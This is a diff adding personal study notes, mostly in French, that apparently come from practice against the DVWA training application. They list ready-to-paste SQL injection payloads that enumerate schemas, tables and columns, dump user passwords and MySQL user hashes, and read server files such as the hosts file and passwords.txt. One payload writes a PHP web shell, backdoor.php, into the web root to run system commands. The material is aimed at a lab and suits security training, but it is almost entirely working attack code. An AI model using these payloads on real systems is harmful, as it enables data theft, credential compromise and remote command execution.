@@ -1,0 +1,75 @@
+Étapes d'extraction avec UNION SELECT
+
+📌 1. Obtenir le nom de la base de données
+
+' UNION SELECT null, concat(database(), ':' , user()), null, null, null, null, null, null #
+
+📌 2. Lister les noms des tables dans la base
+
+' UNION SELECT null, table_name, null, null, null, null, null, null FROM information_schema.tables WHERE table_schema = database() #
+
+📌 3. Lister les noms des colonnes d’une table donnée
+
+' UNION SELECT null, column_name, null, null, null, null, null, null FROM information_schema.columns WHERE table_name = 'users' #
+
+Si tu veux tout combiner et afficher plusieurs infos à la fois avec CONCAT :
+
+' UNION SELECT null, concat(table_name, ':', column_name), null, null, null, null, null, null FROM information_schema.columns WHERE table_name = 'users' #
+
+	Find the following information: database version;
+database user and database name :
+
+	' union select null, concat(database(),':', version(), ':', current_user()) #
+	' UNION SELECT null, concat('VERSION: ', version(), ' | USER: ', user(), ' | DB: ', database()) #
+blue = 1 item = 1 colonne
+
+ Lister les bases de données :
+
+' UNION SELECT null, schema_name FROM information_schema.schemata #
+
+Lister les tables d’une base :
+
+' UNION SELECT null, table_name FROM information_schema.tables WHERE table_schema = 'dvwa' #
+
+Lister les colonnes d’une table :
+
+' UNION SELECT null, column_name FROM information_schema.columns WHERE table_name = 'nom_de_la_table(ex : users)' #
+
+ Pour récupérer le contenu d’une de ces colonnes :
+ 
+ ' UNION SELECT null, last_name FROM users # 
+ ou
+ ' UNION SELECT null, concat(password,':',last_name) FROM users #
+ 
+ Pour recuperer le hash des users :
+ 
+ ' UNION SELECT null, concat(Password('user'), ':', ':', User), null, null, null, null, null, null FROM mysql.user #
+ 
+ POur savoir dans quel dossier l'appli Web tourne :
+ 
+ ' union select @@datadir, null # (ex de resultat : C:\xampp\mysql\data\)
+ 
+ ' union select @@datadir, null, null, null, null, null, null, null #
+' union select null,  load_file('..\\..\\..\\..\\WINDOWS\\system32\\drivers\\etc\\hosts'), null, null, null, null, null, null #
+
+We will use the SELECT … INTO DUMPFILE 'file path' statement to upload a web shell into the web
+server. This shell consists of some HTML code for a web form that has an input box to accept a command and a
+submit button to execute it.
+
+Type in (copy/paste) the following code in the Name input field and hit enter:
+'union select '<form action="" method="post"
+enctype="application/x-www-form-urlencoded"><table style="margin-left:auto; marginright:auto;"><tr><td colspan="2">Please enter system
+command</td></tr><tr><td></td></tr><tr><td class="label">Command</td><td><input
+type="text" name="pCommand" size="50"></td></tr><tr><td></td></tr><tr><td colspan="2"
+style="text-align:center;"><input type="submit" value="Execute Command"
+/></td></tr></table></form><?php echo "<pre>";echo
+shell_exec($_REQUEST["pCommand"]);echo "</pre>"; ?>', null INTO DUMPFILE
+'..\\..\\htdocs\\dvwa\\backdoor.php' #
+
+If we wanted to read something from the web server but instead of dumping the results onto the web page having
+them saved in a file that we write into the web server (for later exfiltration), we can achieve that using
+SELECT load_file() … INTO outfile 'file path' statement :
+
+Type in (copy/paste) the following code in the Name input field and hit enter (or click View Account button):
+' union select null, load_file('..\\..\\passwords.txt'), null, null, null,
+null, null into outfile 'myfile.txt' #
